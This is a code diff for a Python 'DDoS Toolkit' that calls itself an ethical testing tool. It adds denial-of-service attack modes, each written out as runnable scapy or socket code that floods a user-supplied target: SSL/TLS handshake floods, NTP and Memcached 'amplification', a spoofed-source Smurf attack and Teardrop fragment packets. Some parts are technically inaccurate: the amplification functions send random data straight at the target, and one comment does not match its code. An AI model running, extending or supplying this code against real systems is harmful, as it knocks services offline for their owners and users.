@@ -10,43 +10,41 @@
 # Description:       A toolkit designed for simulating various types of Distributed Denial of Service (DDoS) attacks for ethical cybersecurity testing.
 # Author:
 # + MIDØ <https://github.com/Midohajhouj>
-# Version:           v.1.0
+# Version:           v3.0
 # License:           MIT License - https://opensource.org/licenses/MIT
 ### END INIT INFO ###
 
-# =======================================
-#    Libraries Used in the Script
-# =======================================
-
-import aiohttp          # Asynchronous HTTP requests for simulating attacks.
-import asyncio          # Managing asynchronous tasks and event loops.
-import time             # Time-based operations like delays and performance tracking.
-import argparse         # Parsing command-line arguments.
-import threading        # Managing multi-threaded execution of tasks.
-from concurrent.futures import ThreadPoolExecutor, as_completed  # Running concurrent tasks in threads.
-import random           # Randomized data generation for attack patterns.
-import json             # Handling JSON data for configuration or logging.
-from itertools import cycle  # Iterating over proxies or targets repeatedly.
-from collections import deque  # High-performance queues for managing tasks or logs.
-from uuid import uuid4  # Generating unique identifiers for sessions or payloads.
-from base64 import b64encode  # Encoding payloads in Base64 format.
-import hashlib          # Cryptographic hashing for secure data handling.
-import zlib             # Data compression for efficient payload delivery.
-import hmac             # Message authentication using cryptographic hashes.
-import signal           # Handling system signals for clean shutdowns.
-import sys              # System-level operations like exit or argument parsing.
-import os               # Interacting with the file system and environment.
-import subprocess       # Running shell commands and external processes.
-import socket           # Low-level networking operations.
-import struct           # Working with binary data formats.
-import logging          # Recording execution logs and errors.
-import psutil           # Monitoring and managing system resource usage.
-import shutil           # File operations like copying or cleaning up temporary data.
-import scapy.all as scapy  # Crafting and analyzing network packets for attacks.
-import dns.resolver     # Resolving DNS queries for target IP addresses.
-from colorama import init, Fore, Style  # Adding color to terminal output for clarity.
-from tqdm import tqdm   # Progress bar for visual feedback during operations.
-import cmd              # Building interactive command-line interfaces.
+import aiohttp
+import asyncio
+import time
+import argparse
+import threading
+from concurrent.futures import ThreadPoolExecutor, as_completed
+import random
+import json
+from itertools import cycle
+from collections import deque
+from uuid import uuid4
+from base64 import b64encode
+import hashlib
+import zlib
+import hmac
+import signal
+import sys
+import os
+import subprocess
+import socket
+import struct
+import logging
+from logging.handlers import RotatingFileHandler
+import psutil
+import shutil
+import scapy.all as scapy
+import dns.resolver
+from colorama import init, Fore, Style
+from tqdm import tqdm
+import cmd
+import ssl
 
 # Initialize colorama for colorized terminal output
 init(autoreset=True)
@@ -78,14 +76,14 @@ USER_AGENTS = [
 
 HTTP_METHODS = ["GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS"]
 
-# Logging setup
+# Logging setup with rotation
+log_file = "/opt/DDoS-Toolkit/logs/load_test.log"
+os.makedirs(os.path.dirname(log_file), exist_ok=True)
+handler = RotatingFileHandler(log_file, maxBytes=10*1024*1024, backupCount=5)  # 10 MB per file, keep 5 backups
 logging.basicConfig(
     level=logging.INFO,
     format='%(asctime)s - %(levelname)s - %(message)s',
-    handlers=[
-        logging.FileHandler('/opt/DDoS-Toolkit/logs/load_test.log'),
-        logging.StreamHandler()
-    ]
+    handlers=[handler, logging.StreamHandler()]
 )
 
 def display_banner():
@@ -111,7 +109,7 @@ Options:
   -i, --interactive     Start the interactive CLI
   -u URL, --url URL     Target URL or IP address
   -a ATTACK_MODE, --attack-mode ATTACK_MODE
-                        Type of attack to perform (http-flood, ssh-flood, etc.)
+                        Type of attack to perform (http-flood, slowloris, etc.)
   -t THREADS, --threads THREADS
                         Number of threads
   -r RATE_LIMIT, --rate-limit RATE_LIMIT
@@ -130,7 +128,7 @@ def parse_args():
     """Parse command-line arguments."""
     parser = argparse.ArgumentParser(description="DDoS Toolkit Coded By MIDØ")
     parser.add_argument("-u", "--url", required=False, help="Target URL or IP address")
-    parser.add_argument("-a", "--attack-mode", choices=["http-flood", "slowloris", "udp-flood", "syn-flood", "icmp-flood", "dns-amplification", "ftp-flood", "ssh-flood"], default="http-flood", help="Type of attack to perform")
+    parser.add_argument("-a", "--attack-mode", choices=["http-flood", "slowloris", "udp-flood", "syn-flood", "icmp-flood", "dns-amplification", "ftp-flood", "ssh-flood", "ssl-flood", "http2-flood", "ntp-amplification", "memcached-amplification", "smurf", "teardrop"], default="http-flood", help="Type of attack to perform")
     parser.add_argument("-s", "--scan", action="store_true", help="Perform a network scan using NetScan lib ")
     parser.add_argument("-t", "--threads", type=int, default=10, help="Number of threads")
     parser.add_argument("-r", "--rate-limit", type=int, default=100, help="Rate limit for requests per second")
@@ -307,7 +305,7 @@ def run_anonymizer(mode):
     finally:
         print(f"{BLUE}[INFO] Exiting anonymizer handler.{RESET}")
         sys.exit(0)  # Exit the script after completion
-        
+
 async def resolve_target(target_url: str):
     """Resolve the target URL to an IP address."""
     try:
@@ -489,6 +487,25 @@ def ssh_flood(target_ip, target_port, duration):
         time.sleep(0.01)  # Adjust the sleep time to control the attack rate
     print("SSH flood attack completed.")
 
+async def ssl_flood(target_ip, target_port, duration):
+    """Perform an SSL/TLS flood attack by exhausting server resources with handshakes."""
+    print(f"Starting SSL/TLS flood attack on {target_ip}:{target_port} for {duration} seconds...")
+    start_time = time.time()
+    context = ssl.create_default_context()
+
+    while time.time() - start_time < duration:
+        try:
+            # Create a socket and wrap it with SSL/TLS
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            ssl_sock = context.wrap_socket(sock, server_hostname=target_ip)
+            ssl_sock.connect((target_ip, target_port))
+            # Send a partial handshake and close the connection
+            ssl_sock.close()
+        except Exception as e:
+            print(f"Error during SSL/TLS flood: {e}")
+        time.sleep(0.01)  # Adjust the sleep time to control the attack rate
+    print("SSL/TLS flood attack completed.")
+
 async def http2_flood(target_url, stop_event, pause_time, rate_limit, proxies=None, headers=None, payload_type="json", retry=3):
     """Perform an HTTP/2 flood attack with enhanced features and rate limiting."""
     global requests_sent, successful_requests, failed_requests, last_time
@@ -527,6 +544,64 @@ async def http2_flood(target_url, stop_event, pause_time, rate_limit, proxies=No
                             failed_requests += 1
                         logging.error(f"Unexpected error during request (attempt {attempt + 1}): {e}")
                 await asyncio.sleep(pause_time)
+
+def ntp_amplification(target_ip, duration):
+    """Perform an NTP amplification attack."""
+    print(f"Starting NTP amplification attack on {target_ip} for {duration} seconds...")
+    start_time = time.time()
+    while time.time() - start_time < duration:
+        try:
+            # Craft an NTP amplification packet
+            packet = scapy.IP(dst=target_ip) / scapy.UDP(dport=123) / scapy.Raw(load=os.urandom(64))
+            scapy.send(packet, verbose=False)
+        except Exception as e:
+            print(f"Error during NTP amplification: {e}")
+        time.sleep(0.01)  # Adjust the sleep time to control the attack rate
+    print("NTP amplification attack completed.")
+
+def memcached_amplification(target_ip, duration):
+    """Perform a Memcached amplification attack."""
+    print(f"Starting Memcached amplification attack on {target_ip} for {duration} seconds...")
+    start_time = time.time()
+    while time.time() - start_time < duration:
+        try:
+            # Craft a Memcached amplification packet
+            packet = scapy.IP(dst=target_ip) / scapy.UDP(dport=11211) / scapy.Raw(load=os.urandom(64))
+            scapy.send(packet, verbose=False)
+        except Exception as e:
+            print(f"Error during Memcached amplification: {e}")
+        time.sleep(0.01)  # Adjust the sleep time to control the attack rate
+    print("Memcached amplification attack completed.")
+
+def smurf_attack(target_ip, duration):
+    """Perform a Smurf attack."""
+    print(f"Starting Smurf attack on {target_ip} for {duration} seconds...")
+    start_time = time.time()
+    while time.time() - start_time < duration:
+        try:
+            # Craft a Smurf attack packet
+            packet = scapy.IP(src=target_ip, dst="255.255.255.255") / scapy.ICMP()
+            scapy.send(packet, verbose=False)
+        except Exception as e:
+            print(f"Error during Smurf attack: {e}")
+        time.sleep(0.01)  # Adjust the sleep time to control the attack rate
+    print("Smurf attack completed.")
+
+def teardrop_attack(target_ip, duration):
+    """Perform a Teardrop attack."""
+    print(f"Starting Teardrop attack on {target_ip} for {duration} seconds...")
+    start_time = time.time()
+    while time.time() - start_time < duration:
+        try:
+            # Craft a Teardrop attack packet
+            packet = scapy.IP(dst=target_ip, flags="MF", frag=0) / scapy.UDP() / ("X" * 64)
+            packet2 = scapy.IP(dst=target_ip, flags=0, frag=1) / ("X" * 64)
+            scapy.send(packet, verbose=False)
+            scapy.send(packet2, verbose=False)
+        except Exception as e:
+            print(f"Error during Teardrop attack: {e}")
+        time.sleep(0.01)  # Adjust the sleep time to control the attack rate
+    print("Teardrop attack completed.")
 
 def display_status(stop_event: threading.Event, duration: int, results_file=None):
     """Display the status of the load test."""
@@ -652,6 +727,10 @@ async def main(target_url, attack_mode, args):
         target_ip = await resolve_target(target_url)
         target_port = 22  # Default port for SSH
         threading.Thread(target=ssh_flood, args=(target_ip, target_port, args.duration)).start()
+    elif attack_mode == "ssl-flood":
+        target_ip = await resolve_target(target_url)
+        target_port = 443  # Default port for SSL/TLS
+        threading.Thread(target=ssl_flood, args=(target_ip, target_port, args.duration)).start()
     elif attack_mode == "slowloris":
         for _ in range(args.threads):
             task = asyncio.create_task(slowloris_attack(target_url, stop_event, args.pause, args.rate_limit, proxies, headers, args.retry))
@@ -660,6 +739,18 @@ async def main(target_url, attack_mode, args):
         for _ in range(args.threads):
             task = asyncio.create_task(http2_flood(target_url, stop_event, args.pause, args.rate_limit, proxies, headers, args.payload, args.retry))
             tasks.append(task)
+    elif attack_mode == "ntp-amplification":
+        target_ip = await resolve_target(target_url)
+        threading.Thread(target=ntp_amplification, args=(target_ip, args.duration)).start()
+    elif attack_mode == "memcached-amplification":
+        target_ip = await resolve_target(target_url)
+        threading.Thread(target=memcached_amplification, args=(target_ip, args.duration)).start()
+    elif attack_mode == "smurf":
+        target_ip = await resolve_target(target_url)
+        threading.Thread(target=smurf_attack, args=(target_ip, args.duration)).start()
+    elif attack_mode == "teardrop":
+        target_ip = await resolve_target(target_url)
+        threading.Thread(target=teardrop_attack, args=(target_ip, args.duration)).start()
     else:
         for _ in range(args.threads):
             task = asyncio.create_task(rate_limited_attack(target_url, stop_event, args.pause, args.rate_limit, proxies, headers, args.payload, args.retry))
